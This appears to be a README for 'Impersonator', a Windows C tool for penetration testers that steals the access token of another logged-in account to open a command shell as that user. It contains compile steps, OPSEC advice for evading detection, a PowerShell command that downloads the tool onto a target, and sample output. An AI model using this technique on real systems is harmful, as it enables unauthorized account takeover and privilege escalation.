### Impersonator
---------------------------------------
This C program allowes a user with local administrator rights on a Windows machine to impersonate any other logged-in Windows user or service accounts. 
It launches a new CMD console under the context of another logged-in account by enabling 'SeDebugPrivilege' and using access token manipulation techniques.
The program requires a process ID (PID) of the target account's session as an input argument.  

It can be particularly useful during internal penetration tests, when you have full control over a Windows server and aim to compromise another privileged account currently logged into the system.

#### USAGE
- STEP 1 - Compile the source code.  
<i/> OPSEC advice: remove all existing comments and most 'printf' statements from the source code before compiling. </i>
```
Example with Visual Studio 2022 Developer Command Prompt v17.14.14:
-------------------------------------------------------------------
Basic:
+ c:\path-to-project\Impersonator> cl impersonator.c /link advapi32.lib
With an icon:
+ c:\path-to-project\Impersonator> echo IDI_ICON1 ICON "myicon.ico" > appicon.rc
+ c:\path-to-project\Impersonator> rc appicon.rc
+ c:\path-to-project\Impersonator> cl impersonator.c /link advapi32.lib /OUT:impersonator.exe appicon.res
```

- STEP 2 - On your target Windows machine, run the command 'tasklist -v' to display all running processes along with detailed information.
The objective is to identify all the PIDs belonging to the other logged-in Windows account that you want to impersonate.
```
Example
--------
C:\Temp> tasklist -v

Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title   
========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================
<SNIP>
cmd.exe                      16196 Console                    4      5,528 K Running         LAB\pentester                                            0:00:00 Administrator: Command Prompt - tasklist  -v
conhost.exe                  14620 Console                    4     22,828 K Running         LAB\pentester                                            0:00:01 N/A            
cmd.exe                      11052 Console                    4      5,324 K Running         LAB\targetprivuser                                       0:00:00 C:\Windows\system32\cmd.exe 
conhost.exe                  12432 Console                    4     17,696 K Running         LAB\targetprivuser                                       0:00:00 N/A            
notepad.exe                  13044 Console                    4     15,004 K Running         LAB\targetprivuser                                       0:00:00 Sans titre - Bloc-notes             
<SNIP>
```

- STEP 3 - Upload and use the tool 'impersonator' to launch a CMD console under the context of the other logged-in Windows account that you want to impersonate.
```
Example - Acting as the account 'LAB\pentester' (admin rights), we impersonate the account 'LAB\targetprivuser'
----------------------------------------------------------------------------------------------------------------
C:\Temp> powershell -c "wget -uri https://URL/impersonator.exe - OutFile C:\temp\impersonator.exe"

C:\Temp> impersonator.exe 13044
[+] SeDebugPrivilege enabled.
[+] cmd.exe launched as target user!

=> A new CMD is launched as 'LAB\targetprivuser'
   ----------------------------------------------
	 Microsoft Windows [version 10.0.19045.6332]
	 (c) Microsoft Corporation. Tous droits réservés.

	 C:\Windows\system32> whoami
	 LAB\targetprivuser
<SNIP>
```

#### LICENSE
GNU General Public License v3.0
